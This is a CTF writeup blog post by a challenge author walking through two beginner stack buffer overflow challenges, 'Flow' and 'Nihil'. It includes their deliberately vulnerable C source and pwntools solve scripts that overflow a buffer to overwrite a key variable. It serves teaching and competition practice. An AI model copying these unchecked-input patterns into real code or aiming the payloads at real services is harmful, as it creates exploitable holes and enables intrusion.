---
title: "Perfectroot CTF 2024 Writeups"
date: 2024-11-23
layout: "simple"
categories: [walkthroughs]
tags: [pwn]

---

# Introduction 

The p3rf3ctr00t CTF 2024 marked the debut of an exciting competition designed to challenge participants across diverse areas of cybersecurity. As one of the contributors of this event, I had the privilege of crafting some challenges that tested some problem solving skills. 

I will try and walk you through the design and solution of the challenges I created, providing insights into their concepts. Let's learn.
## Flow

![CTFD img](https://gist.github.com/user-attachments/assets/d8a6dae0-b3ee-4420-8f1d-f3140f71830b)


First we are met with the challenge name `Flow`. This was a slight hint that we were to do something with overflows and memory corruption bugs as a whole. We are also provided with the connection where we can use `netcat` to interact with the program from a remote instance.

We can now download the binary and try and understand it's logic. By this we can do some basic file checks which would be pivotal in giving us some information about the binary.

![File check](https://gist.github.com/user-attachments/assets/68602e63-534f-48f7-a1f9-5e78182ef8a4)


The binary is a 64-bit ELF pie executable.

![Checksec](https://gist.github.com/user-attachments/assets/71403ac1-a1ba-43ae-be31-388d9db31230)

We can then move on to check the securities the binary was compiled with. We see that we have a partial RELRO, no canary, NX and PIE  enabled. Now don't worry there, I have a blog where I explain what this means. Check it out [here](https://w47.site/posts/thm/binary103/)

![Running the binary](https://gist.github.com/user-attachments/assets/74f6614f-ea1d-4144-a2cd-0035897eb3ac)

Now we can then run the binary and see what it does. It just asks for input then exits

![Disassembly in pwndbg](https://gist.github.com/user-attachments/assets/d31193eb-d3f5-486a-88f3-1920b8ab2556)


We can then get a lay of the land using `pwndbg`. We have a main, vulnerable and win function in the binary. 

![Disassembling the main function](https://gist.github.com/user-attachments/assets/b1259754-835a-4aa8-bdfd-029d96200097)



Now I can open up the binary in Ghidra and move to the `vulnerable()` function to understand the logic.

![Using ghidra to understand the vulnerable function](https://gist.github.com/user-attachments/assets/b0a4187b-9a40-40d9-a110-752aeb0cbf1c)


The function `vulnerable()` is flawed because it allows for a buffer overflow, where the buffer is allocated with `0x30` bytes that is 48 bytes in decimal on the stack.
The function takes in 64 characters as input but does not check if the input exceeds the buffer size.

This means that any input beyond 48 bytes will overflow the buffer and overwrite adjacent memory on the stack.

The program uses the stack to store, a 48-byte space allocated for input data and a key variable, located just above the buffer which was initially set to `key = 0xc`

From here we see that we have an `if` check that does 

```c
if (local_c == 0x34333231) {
	win();
}
```

This key variable is stored on the stack as a 4-byte (32-bit) integer. The input string provided will treated as a sequence of ASCII characters.

- 1 -> 0x31
- 2 -> 0x32
- 3 -> 0x33
- 4 -> 0x34

When you input the string `1234` it translates into the hexadecimal bytes as shown above.
The next thing to confirm is the type of endianness which we can check using `rabin2 -I flow`

![Checking the file endianness](https://gist.github.com/user-attachments/assets/803893b4-698d-4a5d-8f7c-52595cc1d0cf)

We can clearly see that we have our endian as `little`

Here is a little script to confirm the translation
```python
payload = b'A' * 60 + b"1234"

key_overwrite = payload[-4:]
print("Key in hex: ", key_overwrite.hex())
```

![Hex translation](https://gist.github.com/user-attachments/assets/01d0a6f1-4845-4916-aabb-49b1f891ee99)


### Source Code

```c
#include <stdio.h>

__attribute__((constructor)) void flush_buf() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}

void win() {
    FILE* flag_file;
    char c;

    flag_file = fopen("flag.txt", "r");

    if (flag_file != NULL) {
        printf("Your flag is - ");
        while ((c = getc(flag_file)) != EOF) {
            printf("%c", c);
        }
        printf("\n");
    }
    else {
        printf("Could not find flag.txt\n");
    }
}

void vulnerable() {
    int key = 12;
    char buffer[0x30];

    printf("Enter a text please: ");
    scanf("%64s", buffer);

    if (key == 0x34333231) {
        win();
    }
}

int main() {
    vulnerable();
    return 0;
}
```


### Solve script

```python
from pwn import *

p = remote("94.72.112.248", 7001)

payload = b'a' * 60 + b'1234'

p.send(payload)
p.interactive()
```



## Nihil

![CTFd Image](https://gist.github.com/user-attachments/assets/ac3a1dd2-e1cc-48c2-bb2f-115af9be1457)


The next challenge was also pwn, and this was a bit more tricky and needed one to understand how the stack works. But this challenge is very similar to the first in general. 

![File checks](https://gist.github.com/user-attachments/assets/09107ade-32d3-4272-ae01-0b05a6bd5ec8)

After downloading the binary we can then perform our normal file checks. This informs us that the binary is 64-bit LSB pie executable. 

![checksec](https://gist.github.com/user-attachments/assets/a58457d2-4ce4-4e59-bde1-fe5af0bf6e62)

We can now check the securities the binary was compiled with and it looks pretty much as the challenge `flow` 

We can now run the binary and get a rough idea of what it does

![Running the binary](https://gist.github.com/user-attachments/assets/aac24043-47fb-49b1-bbed-34f5b00a39ec)

Now from the challenge description the author mentions `can you beat me at a guessing game?` . The idea here would be can you get the correct guess in other words. With that in mind we can now disassemble the binary.


![pwndbg](https://gist.github.com/user-attachments/assets/1efead37-8a97-4866-b17a-8cae3989a72d)

We do not have a lot of interesting functions as before, but we can disassemble the main function in Ghidra.

![Ghidra](https://gist.github.com/user-attachments/assets/c736cdac-5692-48ba-bb92-9511b619dc73)

It seems the main function does a check where it compares a variable to a value and then if they are equal, it prints the flag

```c
if (local_c == 0x2d7)
```

Using python we can calculate what `0x2d7` could be potentially to help with crafting of our payload later.

![0x2d7](https://gist.github.com/user-attachments/assets/f9bb02ad-6b19-487a-b08b-2a4a4735a0a8)


Now we can break this down this way. A buffer `char local_28[16]` is allocated, meaning it can hold 15 characters, plus the null terminator.

The `fgets()` function can read up to 100 characters into this buffer. Since the buffer is only 16 bytes in size, reading more than 15 characters will overflow the buffer and overwrite the adjacent memory on the stack.

The stack is organized in a way that variables and control data (like return addresses) are stored in memory blocks. When `fgets()` writes more data than the buffer can hold, it overwrites the memory outside the intended region.
This can cause corruption of adjacent variables or the return address on the layout of the stack.

With this information we can now try and craft our payload. 

```python
from pwn import *

p = remote("94.72.112.248", 7002)

p.sendline(b'727')

payload = b'aaaaaaaaaaaa727'

p.sendline(payload)
p.interactive()
```

We can break down our payload by first sending the value `727` to the binary, then the binary asks us if we have any last words. That is where we can send our the payload that includes, `12 a's` that will help in filling the buffer, and the `727` to make the check equal, this will then print out our flag.

### Source Code

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

FILE *flag_file;
char flag[100];

int main(void) {
        unsigned int pp;
        unsigned long my_pp;
        char buf[16];

        setbuf(stdin, NULL);
        setbuf(stdout, NULL);

        printf("How much did you get? ");
        fgets(buf, 100, stdin);
        pp = atoi(buf);

        my_pp = pp + 1;

        printf("Any last words?\n");
        fgets(buf, 100, stdin);

        if (pp <= my_pp) {
                printf("Ha! I got %d\n", my_pp);
                printf("Maybe you will beat me next time\n");
        } else {
                printf("What, How did you beat me?");

                if (pp == 727) {
                        printf("Here is your flag: ");
                        flag_file = fopen("flag.txt", "r");
                        fgets(flag, sizeof(flag), flag_file);
                        printf("%s\n", flag);
                } else {
                        printf("Just kidding!\n");
                }
        }
                return 0;

}
```

## Conclusion

I took heavy inspiration from past CTF challenges that I came across, so you might have come across this challenges before. I hope you have learned a thing or two about memory corruption bugs

Special shoutout to `0x1337` on solving most of the pwn challenges. You can also get other ways of solving the challenges above and many other more by going through his [article](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/perfectr00t24/solution.md)
